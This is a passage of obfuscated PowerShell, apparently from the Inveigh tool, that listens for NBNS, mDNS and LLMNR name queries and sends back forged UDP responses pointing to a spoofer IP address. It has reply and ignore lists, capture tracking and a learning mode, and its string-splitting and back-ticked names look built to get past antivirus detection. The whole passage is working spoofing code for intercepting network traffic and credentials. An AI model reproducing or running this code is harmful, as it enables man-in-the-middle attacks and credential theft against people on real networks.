                                        ${n`BNS_S`e`Nd_sOck`Et} = &("{0}{2}{1}" -f'N','-Object','ew') ("{2}{0}{3}{4}{1}" -f'Sock','ocket','Net.','e','ts.S')( (&("{2}{3}{0}{1}" -f 'B','LE','GEt-VARi','A')  ("H1"+"TlV") -ValUeon )::"inTEr`N`e`Twork",  ( &("{2}{0}{1}"-f'B','le','vaRIA') 16G  -Va )::"r`AW",  ( &("{0}{1}"-f 'c','HiLDItEm') VARIAblE:QB64xY  ).vaLUE::"U`Dp")
                                        ${NbnS`_`SeNd_`so`cKeT}."SEnd`BUF`FeRS`I`ZE" = 1024
                                        ${N`BnS_`DEST`i`NA`T`iOn_Po`INT} = &("{0}{2}{1}{3}"-f'New-Ob','ec','j','t') ("{2}{0}{1}" -f'et.IPEnd','point','N')(${SO`Urce`_IP},${End`pOIn`T_SouRCE`_`p`O`Rt})
                                        ${N`B`Ns_SEn`D_sOcket}.("{1}{0}"-f'endTo','S').Invoke(${N`BnS_rEsPo`Ns`E_`p`ACkeT},${N`B`Ns`_DESt`InAtI`On_p`oi`NT})
                                        ${n`Bn`S_senD_SOC`KeT}.("{0}{1}"-f 'Clo','se').Invoke()
                                        ${nbNs_`R`ESpO`Nse_MEs`s`AGE} = ("{4}{1}{0}{2}{3}"-f 's','on','e ','sent','- resp')
                                    }
                                    else
                                    {
                                        ${NBn`s_rEques`T_`iGn`ore} = ${tr`Ue}
                                    }
                                    
                                }
                                else
                                {

                                    if(${s`ou`RCe_IP} -eq ${i`p} -and ${NB`N`s_LEarnin`g`_LOG}.("{0}{1}" -f 'E','xists').Invoke({param(${S}) ${S} -like "* " +  (&("{1}{0}" -f'CI','G')  vArIablE:CyJ6E1  ).VAluE::"ToS`Tr`ING"(${pA`yLoAd_B`yteS}[0..1]) + " *"}))
                                    {
                                        ${NbNs`_`ReQuES`T`_iGn`o`Re} = ${t`Rue}
                                    }
                                    elseif(${NbNst`Y`peS} -notcontains ${NBN`s_`quEry_typE})
                                    {
                                        ${n`Bn`S_resPONsE`_MeS`sage} = ("{2}{4}{5}{3}{0}{6}{1}" -f 'NS','ype','- d','d NB','i','sable',' t')
                                    }
                                    elseif(${sPoOF`erHOst`Sr`EpLY} -and ${sPOO`FeR`h`OS`TsrEP`LY} -notcontains ${nBns_QUer`y`_ST`RinG})
                                    {
                                        ${Nbns_r`E`SP`onse_`M`EsSA`GE} = ('- '+"$NBNS_query_string "+'i'+'s '+'n'+'ot '+'o'+'n '+'rep'+'ly '+'l'+'ist')
                                    }
                                    elseif(${s`po`OF`e`RH`OSTSi`GnorE} -and ${S`PO`Of`ErhOSTsIgnO`RE} -contains ${nBN`s`_qUer`y_StRinG})
                                    {
                                        ${Nb`Ns_RES`P`o`N`se`_MessAge} = ('- '+"$NBNS_query_string "+'is'+' '+'o'+'n '+'ig'+'nore'+' '+'l'+'ist')
                                    }
                                    elseif(${sp`oOFERIP`SR`Ep`ly} -and ${spoOfERi`Ps`REP`lY} -notcontains ${s`Ou`RCe_IP})
                                    {
                                        ${NBNs`_re`sP`onsE_Mes`sA`ge} = ('- '+"$source_IP "+'i'+'s '+'not'+' '+'on'+' '+'r'+'ep'+'ly '+'li'+'st')
                                    }
                                    elseif(${s`P`O`OFErIpSi`gnORe} -and ${SPOOFe`Ri`PS`ig`N`oRe} -contains ${s`ouRce`_IP})
                                    {
                                        ${n`Bns`_Re`spo`NSe`_message} = ('- '+"$source_IP "+'is'+' '+'o'+'n '+'igno'+'re'+' '+'li'+'st')
                                    }
                                    elseif(${Nbn`S`_Query_`sT`Ri`NG}.("{0}{1}"-f'T','rim').Invoke() -eq '*')
                                    {
                                        ${N`BNs_`ReSPOnSE_`m`essaGE} = ("{3}{0}{1}{2}" -f 'NBSTAT',' ','request','- ')
                                    }
                                    elseif(${IN`VE`Igh}."VaLid`_H`OST`_`liSt" -contains ${nb`NS_q`Uery_St`RING})
                                    {
                                        ${n`Bns_RESP`onSE_M`eSsA`ge} = ('- '+"$NBNS_query_string "+'is'+' '+'a '+'vali'+'d'+' '+'hos'+'t')
                                    }
                                    elseif(${Inv`E`igH}."ip`_caPtUrE_`li`st" -contains ${sO`Ur`ce_`ip}."ip`Ad`d`REsstOs`T`RIng")
                                    {
                                        ${NbnS`_`RESpONSE_M`eSs`Age} = ('- '+'pr'+'eviou'+'s '+'captu'+'re'+' '+'from'+' '+"$source_IP")
                                    }
                                    elseif(${sP`OO`FE`R`lEa`RniNgdEL`Ay} -and ${S`POOF`ER`_LEARnInG_`stO`PW`AtcH}."E`LA`pSed" -lt ${Sp`o`O`FER_`le`ARninG_`DeLaY})
                                    {
                                        ${N`BnS_`ResP`ON`se_mE`SsAgE} = "- " + [Int](${sPOOf`Er`leaRNi`NGDEL`Ay} - ${sPOoFeR_LE`A`Rni`NG`_S`T`O`pWa`TcH}."ElaPs`ed"."T`O`TAlmInUTES") + ("{9}{0}{2}{6}{8}{3}{4}{7}{1}{5}"-f 'min','tart','u','(s)',' un','s','t','til spoofing s','e',' ')
                                    }
                                    elseif(${sO`URCE`_`Ip} -eq ${Ip} -and !${nB`Ns_lE`ArNiNg`_`lOg}.("{1}{2}{0}" -f'sts','E','xi').Invoke({param(${s}) ${S} -like "* " +   $Cyj6E1::"t`os`TRINg"(${pa`y`Loa`D_b`YTES}[0..1]) + " *"}))
                                    {
                                        ${NB`Ns_REs`p`OnSe_`mE`SsAGE} = ("{4}{0}{2}{1}{3}" -f 'lo','l reques','ca','t','- ')
                                    }
                                    else
                                    {
                                        ${nbNs_rEs`p`ONSE_`MESs`AGe} = ("{1}{0}{5}{2}{6}{4}{3}"-f 't','- some','went','g','n','hing ',' wro')
                                    }

                                }

                            }

                            if(!${n`BNs_`ReQUeST_Ig`Nore} -and   ( &("{2}{1}{0}"-f'LdItem','I','CH')  vaRIAbLe:CyJ6e1  ).ValUe::"TO`ST`RiNg"(${p`AYLoAD_B`YtEs}[4..7]) -eq ("{2}{0}{3}{1}" -f '-0','0','00','1-00-0'))
                            {
                                ${iN`VEigh}."c`o`NSolE_`queUe".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))

                                if(${iN`Ve`iGH}."fI`le_o`UTPuT")
                                {
                                    ${I`NV`eigH}."LOg`_F`iLE_QUeuE".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))
                                }

                                if(${iNVe`i`gH}."L`Og_`OutP`Ut")
                                {
                                    ${I`NVE`iGH}."L`og".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))
                                }

                            }
                            elseif(${sPoOf`eRle`ARNI`NG} -eq 'Y' -and   ( &("{0}{1}{2}"-f 'v','aR','iAbLe') Cyj6e1 -VA  )::"T`os`TrinG"(${Pay`L`oaD_B`Y`Tes}[4..7]) -eq ("{1}{0}{2}"-f'0-00-','0','00-01') -and ${nB`N`s_lEArn`i`NG_lOG}.("{1}{2}{0}"-f'sts','E','xi').Invoke({param(${S}) ${s} -like "* " +  $cyj6E1::"Tos`TRI`NG"(${PAYlOad`_`BY`TES}[0..1]) + " *"}))
                            {
                                [Byte[]]${nBNS_`RespO`N`Se_ip_ByT`es} = ${Pay`L`o`Ad_bY`Tes}[(${paY`LO`A`D_BytEs}."lEn`g`TH" - 4)..(${pAYL`oAd_B`y`T`ES}."Leng`Th")]
                                ${Nbn`s_rESPOns`E`_`IP} = [System.Net.IPAddress]${NbnS_r`Es`P`o`NsE_iP`_by`Tes}
                                ${NBN`S_rEsp`O`N`Se_Ip} = ${NbnS`_Res`Po`NS`e_iP}."I`p`Ad`dressToS`TRIng"

                                if(${Inv`ei`gh}."vAlId_h`o`st_li`st" -notcontains ${NbN`S_qUeRY_st`R`iNG})
                                {
                                    ${i`NV`eIgh}."VALI`d_`host_`liSt".("{1}{0}" -f'dd','A').Invoke(${n`Bns_`q`U`Ery_stR`INg})
                                    ${in`VE`igh}."conS`O`L`E_quE`UE".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list "))

                                    if(${I`NV`EIgH}."file_oU`T`PuT")
                                    {
                                        ${inv`EIgH}."l`og_FILe_q`U`EUE".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list "))
                                    }

                                    if(${inve`iGH}."LO`g_o`UTput")
                                    {
                                        ${Inv`e`IGH}."L`Og".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list "))
                                    }

                                }

                            }

                        }

                    }

                    5353 
                    {   
                        
                        if(  $cyJ6e1::("{2}{0}{1}"-f 't','ring','ToS').Invoke(${paY`LOA`D_`ByTEs}) -like ("{1}{2}{0}"-f'1','*-00-01-80','-0'))
                        {
                            ${UdP_`lE`N`GTh}[0] += 10
                            ${M`dnS_`QuERY_PAYL`oad_BY`TeS} = ${paY`lOA`d_`Byt`ES}[(12)..(${payLo`AD`_By`TEs}."le`Ng`TH" - 5)]
                            ${MDns_Q`Ue`RY`_STRIng} = &("{3}{1}{0}{2}" -f'tr','ToS','ing','Data') 1 ${mdN`S_`QUeRy_Pa`Yload_BYT`Es}[0] ${MD`Ns_q`UeRY_p`A`YLo`Ad_b`YtES}
                            ${MdNS_QU`ERY`_s`Trin`G_full} = ${m`DNS`_que`RY_StRing} + ("{0}{2}{1}"-f '.lo','al','c')

                            ${Md`Ns`_`R`e`SPOnsE_DAta} = ${Md`Ns_`qu`Ery`_P`AYLoAd_BY`Tes} +
                                                    0x00,0x01,0x00,0x01 +
                                                    ${m`dNs_tTl_byT`Es} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${SPo`o`Ferip})).("{0}{4}{3}{2}{1}" -f 'G','ssBytes','ddre','A','et').Invoke()
                        
                            ${md`Ns_Res`PoNsE_P`Ac`keT} = 0x14,0xe9 +
                                                    ${sO`U`RcE`_POrT}[1,0] +
                                                    ${UDp_lEN`G`TH}[1,0] +
                                                    0x00,0x00 +
                                                    ${pAy`l`oad_BYTes}[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    ${Md`N`s_reSpoN`sE_d`Ata}
                            
                            if(${m`dNs} -eq 'Y')
                            {

                                if((!${SPoOFer`h`OsTS`R`EPLy} -or ${sP`oOF`ERHoS`TsRE`pLy} -contains ${mdnS_Q`UERy_`S`TRIng}) -and (!${spoofEr`h`oSTSiG`Nore} -or ${SpoO`FerhO`STsi`GnO`Re} -notcontains ${M`dnS_QUeRY_sT`Ri`NG}) -and (
                                !${s`Pooferi`Ps`ReP`Ly} -or ${sP`Oo`FErI`PSrEPLy} -contains ${sOuR`C`e_ip}) -and (!${S`POo`FERi`pSig`NOrE} -or ${spOOFe`Ri`p`S`IGNOrE} -notcontains ${s`ouRCE_`iP}) -and (
                                ${iN`VE`igH}."S`P`oo`FER_re`PeAt" -or ${INV`e`IgH}."Ip_CApt`UrE`_`li`St" -notcontains ${S`o`UrcE_IP}."IpADdrE`S`s`To`STri`Ng") -and (${MDn`STyp`Es} -contains 'QU'))
                                {
                                    ${S`ENd_`SOcKET} = &("{1}{2}{0}"-f'ect','New-O','bj') ("{0}{1}{6}{3}{5}{2}{4}" -f 'Sy','ste','s.','N','Socket','et.Socket','m.')(  (&("{2}{1}{0}" -f 'T-iTEM','E','g')  ('vA'+'rIabLe:H'+'1'+'tLV')).vALUE::"iNtE`R`NEt`work",  (  &('Gi') variAblE:16G).vAlUe::"R`AW", ( &("{1}{0}" -f'CI','g')  ("va"+"Ri"+"AB"+"le:Qb64X"+"Y")).vaLUE::"U`dP" )
                                    ${s`e`ND_S`oCkET}."Se`NDbu`FfErSi`Ze" = 1024
                                    ${D`EsTiNA`Ti`on_PoiNT} = &("{1}{0}{2}"-f'-O','New','bject') ("{1}{2}{4}{0}{6}{3}{5}"-f 'ndp','System.Net.','IP','in','E','t','o')(${soUR`ce`_IP},${E`N`DPOINT`_`s`OUrC`e_POrT})
                                    ${SeND_`s`OCK`Et}.("{1}{0}"-f'dTo','Sen').Invoke(${mdNs_rESpo`N`SE_P`A`ckEt},${De`St`iNA`TION_`POInT})
                                    ${Send_s`Oc`K`eT}.("{0}{1}" -f'Clo','se').Invoke()
                                    ${M`Dn`S_R`ES`PONSe_meSs`AGE} = ("{3}{0}{1}{4}{2}" -f ' r','esp','ent','-','onse s')
                                }
                                else
                                {

                                    if(${mdN`sTY`Pes} -notcontains 'QU')
                                    {
                                        ${m`dNS_res`POn`SE_`ME`sS`Age} = ("{3}{0}{1}{2}{5}{4}"-f'di','sable','d m','- ','NS type','D')
                                    }
                                    elseif(${SpOOf`E`Rho`st`SReply} -and ${s`pOoFerhOsT`S`REp`LY} -notcontains ${M`DNs_q`UErY_ST`Ring})
                                    {
                                        ${MD`N`s_`Res`PONSe`_MEsS`AgE} = ('- '+"$mDNS_query_string "+'i'+'s '+'not'+' '+'on'+' '+'rep'+'l'+'y '+'lis'+'t')
                                    }
                                    elseif(${S`pO`OFERh`ostSIg`N`OrE} -and ${SpooFE`RHOStsign`O`Re} -contains ${m`Dns_`qU`ERy_`StrInG})
                                    {
                                        ${m`Dns_`RESP`onSe`_`mEsS`AGe} = ('- '+"$mDNS_query_string "+'i'+'s '+'o'+'n '+'igno'+'r'+'e '+'li'+'st')
                                    }
                                    elseif(${SPo`Of`ERiP`Sr`epLy} -and ${s`PooferI`pS`Rep`Ly} -notcontains ${S`ourC`e_ip})
                                    {
                                        ${M`dNs_`Re`S`poNsE_mESSa`gE} = ('- '+"$source_IP "+'is'+' '+'no'+'t '+'o'+'n '+'repl'+'y '+'li'+'st')
                                    }
                                    elseif(${SPO`O`F`E`RIp`SIgNOrE} -and ${s`POoFEr`IPsiGNO`Re} -contains ${sOU`RCe`_Ip})
                                    {
                                        ${M`d`NS`_RE`SPONs`E_ME`SsAGE} = ('- '+"$source_IP "+'is'+' '+'o'+'n '+'igno'+'re'+' '+'li'+'st')
                                    }
                                    else
                                    {
                                        ${MD`NS`_Re`SPon`SE`_`MEsSAge} = ("{0}{2}{4}{1}{3}{5}{6}" -f '- not ','fed due ','spo','to previous ','o','ca','pture')
                                    }
                                
                                }
                            
                            }

                            ${INv`E`IGh}."C`onsOLE_qUe`Ue".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))

                            if(${i`N`VEiGH}."fi`Le_OU`TpUt")
                            {
                                ${I`Nveigh}."l`Og_`FiLE_`qUe`Ue".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                            }

                            if(${IN`VEiGh}."lOG_oU`T`P`Ut")
                            {
                                ${in`VeI`gh}."l`OG".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                            }

                        }
                        elseif( $Cyj6E1::("{0}{1}"-f 'ToSt','ring').Invoke(${paYL`oAd_`BYT`eS}) -like ("{3}{4}{5}{1}{2}{6}{0}"-f'-*','-61-6','C-00-00-','*-','05-6C-6F-','63','01-00-01'))
                        {
                            ${UDP_`LEn`gTh}[0] += 4
                            ${m`dns`_qUE`Ry_`PAy`load_BytEs} = ${P`AYLoad`_B`Ytes}[12..(${P`A`yLoAd_B`YtES}[12] + 12)]
                            ${mD`N`S_quer`y_STr`I`NG} = &("{1}{3}{0}{2}" -f'To','Dat','String','a') 1 ${MdnS`_q`UE`RY`_`pay`loAD_bYtes}[0] ${mdN`s_`QUerY`_PAYLO`Ad_`B`ytes}
                            ${MDnS`_qU`ery`_`sTRIng`_full} = ${mDns_QU`eRY_S`Tri`NG} + ("{0}{1}" -f'.','local')

                            ${MdnS_respoN`SE_`da`TA} = ${mdnS_qUe`RY_p`Ayl`OAD`_byTes} +
                                                    0x05,0x6c,0x6f,0x63,0x61,0x6c,0x00 +
                                                    0x00,0x01,0x80,0x01 +
                                                    ${Md`Ns_`TtL_`ByteS} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${S`p`oOfERip})).("{0}{1}{4}{2}{3}"-f'GetA','dd','By','tes','ress').Invoke()

                        
                            ${m`DNS_reS`pONsE`_pa`C`KET} = 0x14,0xe9 +
                                                    ${Sou`RcE`_PO`RT}[1,0] +
                                                    ${u`dp_l`ENgtH}[1,0] +
                                                    0x00,0x00 +
                                                    ${pa`YL`oa`D_bYteS}[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    ${md`Ns_`RESPo`Nse`_dAta}
                   
                            if(${m`Dns} -eq 'Y')
                            {

                                if((!${SpoOFerH`OSt`Sr`E`plY} -or ${SPoo`FERHOstSr`ep`ly} -contains ${M`dNS_`QuE`RY_STRinG}) -and (!${s`pOo`FE`RHOsTsigNOre} -or ${Spo`OfE`RHostSign`orE} -notcontains ${m`dns`_QuErY_`St`R`ing}) -and (
                                !${sp`OofE`RIP`Sr`EPLy} -or ${s`POOF`eRip`s`REPly} -contains ${SoUr`cE`_ip}) -and (!${s`poofEriP`sign`oRe} -or ${SPoofE`Ri`psi`gnOrE} -notcontains ${so`UrcE`_`ip}) -and (
                                ${i`Nv`eIGh}."S`POOf`e`R_rEp`EaT" -or ${in`VE`iGH}."Ip_`CAP`T`URe_list" -notcontains ${sO`UrCe`_`iP}."i`PaDDrEsStos`TR`INg") -and (${mDN`sTy`pEs} -contains 'QM'))
                                {
                                    ${SEn`D_soc`k`Et} = &("{1}{2}{0}" -f 't','Ne','w-Objec') ("{4}{0}{5}{1}{2}{3}" -f 't','.S','ock','et','System.Ne','.Sockets')( ( &("{0}{1}"-f 'gc','i')  ("VAriAb"+"lE:H1t"+"L"+"V")  ).ValUE::"iN`TER`NEtW`oRk",  ( &("{1}{0}"-f 'rIabLE','VA')  16g -ValUEo)::"R`Aw", (  &("{2}{3}{1}{0}" -f'le','Ab','gEt-Var','I') ('q'+'b'+'64XY')  -vA )::"U`dP" )
                                    ${SENd`_S`o`CkeT}."sEnd`BUffe`RsIZe" = 1024
                                    ${D`es`TIn`Ation_P`oint} = &("{1}{0}{2}"-f 'Objec','New-','t') ("{5}{2}{3}{0}{1}{4}"-f'em.Net.IP','Endpoi','y','st','nt','S')([IPAddress]("{0}{2}{1}" -f '22','.0.251','4.0'),5353)
                                    ${S`eN`d_SOCK`eT}.("{1}{0}{2}"-f'en','S','dTo').Invoke(${mDNs_RES`P`onSE_`p`AcK`Et},${D`E`St`i`NAtiON_Po`INt})
                                    ${Se`ND_`soCK`ET}.("{1}{0}" -f 'ose','Cl').Invoke()
                                    ${M`D`NS_R`EspOn`Se`_mE`SsAge} = ("{1}{4}{2}{0}{3}" -f'ns','- ','spo','e sent','re')
                                }
                                else
                                {

                                    if(${M`Dnst`yPEs} -notcontains 'QM')
                                    {
                                        ${M`dnS_`R`Es`ponsE_mesSA`Ge} = ("{2}{0}{4}{1}{3}"-f 's','bled','- di',' mDNS type','a')
                                    }
                                    elseif(${s`p`O`OFerh`OStSrePlY} -and ${SpoofErHoSt`sre`P`lY} -notcontains ${M`Dns_qu`ErY`_STR`ing})
                                    {
                                        ${M`dNS`_`R`EsPoNS`e`_mEsSAgE} = ('- '+"$mDNS_query_string "+'is'+' '+'n'+'ot '+'o'+'n '+'reply'+' '+'l'+'ist')
                                    }
                                    elseif(${sPo`Oferh`ost`sI`GN`O`Re} -and ${sp`Oo`F`E`RhOsTsIgnORe} -contains ${MdnS_`Quer`Y`_StR`INg})
                                    {
                                        ${M`dNs`_reSPo`NSE_Me`SSagE} = ('- '+"$mDNS_query_string "+'is'+' '+'on'+' '+'igno'+'re '+'lis'+'t')
                                    }
                                    elseif(${sPo`oFeRIp`srEP`ly} -and ${spoOF`ERIp`s`RE`plY} -notcontains ${s`OUR`c`e_IP})
                                    {
                                        ${mdns_rEsP`onse`_`mESs`A`ge} = ('- '+"$source_IP "+'is'+' '+'no'+'t '+'on'+' '+'rep'+'ly '+'l'+'ist')
                                    }
                                    elseif(${spo`ofe`RiPsig`No`Re} -and ${SPoO`FERIp`sigNO`Re} -contains ${sOU`Rc`E_Ip})
                                    {
                                        ${M`D`Ns_resPONSe`_m`eSs`A`GE} = ('- '+"$source_IP "+'i'+'s '+'o'+'n '+'i'+'gnor'+'e '+'lis'+'t')
                                    }
                                    else
                                    {
                                        ${MdnS_`RespO`N`s`e_meSS`A`ge} = ("{2}{8}{4}{5}{9}{0}{6}{7}{1}{3}"-f's','a','- no','pture',' due',' to ',' ','c','t spoofed','previou')
                                    }
                                
                                }
                            
                            }

                            ${inV`e`IGH}."coN`soLe`_QuE`Ue".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))

                            if(${I`NVEIgh}."fI`lE_OU`Tp`Ut")
                            {
                                ${I`Nv`EIgH}."L`Og_`FILE_Qu`EUE".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                            }

                            if(${iN`Ve`Igh}."loG_`ouT`PUT")
                            {
                                ${inv`EiGh}."L`Og".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                            }

                        }
                        
                    }

                    5355 
                    {

                        if(  (  &("{1}{0}"-f 'ir','d')  VARIaBLe:Cyj6e1).vAlUE::"TO`S`TRing"(${pAYLo`Ad`_b`yTes}[(${pA`Y`LOad_Byt`Es}."Le`Ng`TH" - 4)..(${p`Ay`l`OAD_bYTEs}."leN`GtH" - 3)]) -ne ("{1}{0}"-f 'c','00-1')) 
                        {
                            ${u`DP_L`E`NgTh}[0] += ${pAyLo`Ad`_BYTES}."leN`gTH" - 2
                            ${Llm`NR_reSpONs`e_`DA`TA} = ${PaYLOAD_BY`T`eS}[12..${PA`Y`L`oAd_`ByTeS}."L`ENGTh"]

                            ${LlMNr_`RESP`OnSe_`Da`TA} += ${ll`mn`R`_`R`EspoNSE_daTa} +
                                                    ${llMN`R_`T`TL_BytES} +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${SPo`O`FerIp})).("{0}{2}{1}" -f'GetAdd','tes','ressBy').Invoke()
            
                            ${l`LMNR_rEsP`ons`e_`PacKET} = 0x14,0xeb +
                                                        ${souRCe`_Po`RT}[1,0] +
                                                        ${udp_l`en`gTh}[1,0] +
                                                        0x00,0x00 +
                                                        ${pa`y`LoAd_BY`T`Es}[0,1] +
                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                        ${LL`m`Nr_ReS`PONSe_Da`TA}
                
                            ${llM`Nr_`Q`UErY} =   (  &("{2}{1}{0}"-f'blE','ia','VaR') ('cy'+'J6e1')  -VaLUeOnL )::"toST`RI`Ng"(${pAylOAD`_bYT`ES}[13..(${PAy`LoaD_BY`T`es}."l`ENGtH" - 4)])
                            ${LlMN`R_qu`ERY} = ${L`lmN`R_quE`RY} -replace "-00",""

                            if(${LLmNR_Q`UE`RY}."lEn`GtH" -eq 2)
                            {
                                ${Ll`MN`R_quErY} = [Char] (  &("{2}{0}{1}" -f'l','e','vARIAb') igu7QM).vAlue::("{0}{1}" -f 'To','Int16').Invoke(${lLm`N`R`_qUerY},16)
                                ${LlMNR_qUErY`_s`T`RINg} = &("{1}{2}{0}"-f 'ject','New-','Ob') ("{0}{2}{1}{3}"-f'S','ri','ystem.St','ng')(${LlMnr`_`qU`ery})
                            }
                            else
                            {
                                ${LLmn`R_`que`Ry} = ${LLmnR`_QU`Ery}.("{0}{1}" -f 'Spli','t').Invoke("-") | &("{2}{1}{0}" -f'Object','rEach-','Fo'){[Char] (&("{1}{0}"-f'r','dI')  VARiaBLe:igU7Qm).VAluE::("{1}{0}" -f '16','ToInt').Invoke(${_},16)}
                                ${Ll`mNr_qUerY`_s`TrIng} = &("{1}{2}{0}"-f 'ect','New-O','bj') ("{0}{1}{3}{2}"-f 'Sys','tem.St','ing','r')(${lLMn`R_q`U`ery},0,${L`L`mNr_QuE`Ry}."L`eNgtH")
                            }

                            ${L`l`mn`R_R`EqUE`st`_IgnORE} = ${FA`l`SE}
                
                            if(${l`l`MnR} -eq 'Y')
                            {

                                if(${S`PO`o`FER`l`eArNING} -eq 'Y' -and ${iNVEi`gH}."val`ID_h`OsT_`LisT" -notcontains ${L`L`MnR_quERY_`s`TRIng} -and ${sou`Rc`e_ip} -ne ${Ip})
                                {

                                    if((${LL`MnR_LearN`i`NG_l`og}.("{1}{0}{2}"-f'xi','E','sts').Invoke({param(${s}) ${s} -like ('20'+'* '+"$LLMNR_query_string")})))
                                    {
                                        ${l`l`MN`R_leA`RNI`N`g_Queue_tiMe} = [DateTime]${LlmN`R_L`E`Arn`Ing_LOg}.("{1}{0}"-f'nd','Fi').Invoke({param(${S}) ${s} -like ('2'+'0* '+"$LLMNR_query_string")}).("{0}{1}"-f 'SubS','tring').Invoke(0,19)

                                        if((&("{0}{1}"-f'Get-D','ate')) -ge ${lLMnr_lE`A`R`NIN`g`_`qUeue_tIME}.("{1}{2}{3}{0}"-f'es','Ad','d','Minut').Invoke(${SP`ooFerl`Ea`RniNgI`N`T`ERVAl}))
                                        {
                                            ${llmN`R_`L`eARn`InG_LoG}.("{2}{0}{1}" -f 'move','At','Re').Invoke(${l`LmNr_L`e`Arn`i`Ng_`lOg}.("{2}{1}{0}"-f 'Index','ind','F').Invoke({param(${s}) ${S} -like ('20'+'* '+"$LLMNR_query_string")}))
                                            ${Llm`N`R_lE`ARNIN`g_`SenD} = ${TR`UE}
                                        }
                                        else
                                        {
                                            ${llmn`R`_`lEAr`N`iNG_SEnD} = ${f`ALSE}
                                        }

                                    }
                                    else
                                    {           
                                        ${llMNR`_le`ARN`inG_Send} = ${tr`UE}
                                    }

                                    if(${lLmn`R_lE`Ar`Ning`_`s`EnD})
                                    {
                                        ${llMnR_t`R`ANS`Ac`TioN_id} = [String](1..2 | &("{2}{0}{3}{1}"-f'orEa','ject','F','ch-Ob') {"{0:X2}" -f (&("{2}{1}{0}"-f'om','nd','Get-Ra') -Minimum 1 -Maximum 255)})
                                        ${lLmnR`_t`RansActi`ON_ID_BYt`Es} = ${lLMNR`_`TRAn`saCt`Io`N_id}.("{1}{0}"-f 'lit','Sp').Invoke(" ") | &("{0}{1}{4}{2}{3}" -f 'Fo','rE','-O','bject','ach'){[Char] (  &('gi') varIABLE:iGU7qM  ).valUe::("{1}{0}"-f 't16','ToIn').Invoke(${_},16)}
                                        ${lLm`NR_T`R`AnSACt`i`On`_id} = ${llM`Nr_tra`Ns`ActiOn`_iD} -replace " ","-"
                                        ${llMnR`_UdP`_Cl`IENt} = &("{1}{2}{0}"-f 'Object','n','ew-') ("{6}{3}{1}{2}{5}{0}{7}{4}{8}"-f'ts.U','Net.Soc','k','ystem.','i','e','S','dpCl','ent')
                                        ${L`Lmn`R_H`Os`TnAm`E_`ByteS} = ${pa`Y`lOA`D_b`YtES}[13..(${p`A`ylO`Ad_bYtes}."Le`Ng`TH" - 5)]

                                        ${ll`M`NR`_reQuEST_`pACKET} = ${LL`m`Nr_TR`AnsaCtIoN_I`D_by`TEs} +
                                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                                (${lLMnr_`Ho`StN`A`m`E_byTES}."LEn`Gth" - 1) +
                                                                ${lLmnR_h`OSTN`AmE`_`ByT`ES} +
                                                                0x00,0x01,0x00,0x01

                                        ${L`lmnr_`LeArn`i`NG_`DEsTINAT`ion_`End`poiNT} = &("{1}{3}{2}{0}" -f'ect','New','Obj','-') ("{4}{3}{1}{2}{0}"-f 'nt','m.Net.I','PEndpoi','te','Sys')([IPAddress]("{0}{1}{2}{3}"-f'2','24','.','0.0.252'),5355)
                                        ${L`LmnR_u`D`P`_Cl`Ient}.("{0}{1}{2}" -f'C','o','nnect').Invoke(${l`lMNr_l`EarniN`g_de`s`TInatiOn_E`NdP`OiNT})
                                        ${lLMn`R`_u`dp`_C`lIENT}.("{1}{0}" -f'd','Sen').Invoke(${L`LM`Nr_r`EQUEst`_PACKeT},${lLMNR`_reQUe`S`T_p`AckET}."L`engTh")
                                        ${lLMn`R_U`DP_`cl`ienT}.("{1}{0}" -f'e','Clos').Invoke()
                                        ${lLm`Nr_LearN`in`G_`l`Og}.("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') $LLMNR_transaction_ID $LLMNR_query_string "))
                                        ${inVE`igh}."Co`NSOle`_q`UEue".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252 "))

                                        if(${in`VeigH}."FIL`e_`OUTPut")
                                        {
                                            ${INveI`GH}."L`OG_fiLe_que`Ue".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252 "))
                                        }

                                        if(${in`V`EiGh}."l`og_oUt`PUT")
                                        {
